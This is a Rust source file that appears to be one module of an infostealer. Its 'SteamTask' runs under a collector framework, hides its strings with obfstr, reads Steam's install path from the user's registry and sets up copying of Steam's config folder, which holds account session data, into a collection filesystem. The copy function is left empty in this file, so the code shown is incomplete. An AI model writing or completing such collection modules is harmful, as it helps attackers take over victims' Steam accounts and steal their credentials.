use crate::alloc::borrow::ToOwned;
use alloc::vec::Vec;
use collector::Collector;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use obfstr::obfstr as s;
use regedit::{read_registry_value, RegistryValue};
use tasks::{parent_name, Task};
use windows_sys::Win32::System::Registry::HKEY_CURRENT_USER;

pub(crate) struct SteamTask;

impl<C: Collector, F: FileSystem> Task<C, F> for SteamTask {
    parent_name!("Steam");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(steam_path) = steam_path(StorageFileSystem) else {
            return
        };

        if !StorageFileSystem.is_exists(&steam_path) {
            return
        }

        copy_configs_path(
            StorageFileSystem,
            steam_path,
            filesystem,
            parent
        )
    }
}

fn steam_path<R, F>(fs: R) -> Option<Path>
where
    R: AsRef<F>,
    F: FileSystem
{
    let RegistryValue::String(root) = read_registry_value(HKEY_CURRENT_USER, s!("Software\\Valve\\Steam"), s!("SteamPath"))
        .ok()?
    else {
        return None;
    };

    Some(Path::new(root) / "config")
}

fn copy_configs_path<SrcFsRef, SrcFs, DstFsRef, DstFs, S, D>(
    src_fs: SrcFsRef,
    config_path: S,
    dst_fs: DstFsRef,
    save_path: D
)
where
    SrcFsRef: AsRef<SrcFs>,
    DstFsRef: AsRef<DstFs>,
    SrcFs: FileSystem,
    DstFs: FileSystem,
    S: AsRef<Path>,
    D: AsRef<Path>,
{

}